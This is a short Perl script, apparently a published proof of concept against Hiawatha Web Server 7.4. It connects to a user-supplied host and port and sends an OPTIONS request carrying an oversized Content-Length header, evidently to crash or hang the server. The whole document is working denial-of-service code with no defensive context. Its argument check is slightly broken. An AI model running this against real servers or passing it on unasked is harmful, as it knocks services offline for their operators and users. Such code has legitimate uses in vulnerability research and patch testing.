# Hiawatha Web Server 7.4
#!/usr/bin/perl
use IO::Socket;
        if (ARGV < 1) {
                usage();
        }
        $ip     = $ARGV[0];
        $port   = $ARGV[1];
        print "[+] Sending request...\n";
        $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
        print $socket "OPTIONS * HTTP/1.1\r\n";
        print $socket "Host: http://www.dclabs.com.br\r\n";
        print $socket "Content-Length: 2147483599\r\n\r\n";
        sleep(3);
        close($socket);
        print "[+] Done!\n";

sub usage() {
        print "[-] Usage: <". $0 ."> <host> <port>\n";
        print "[-] Example: ". $0 ." 127.0.0.1 80\n";
        exit;
}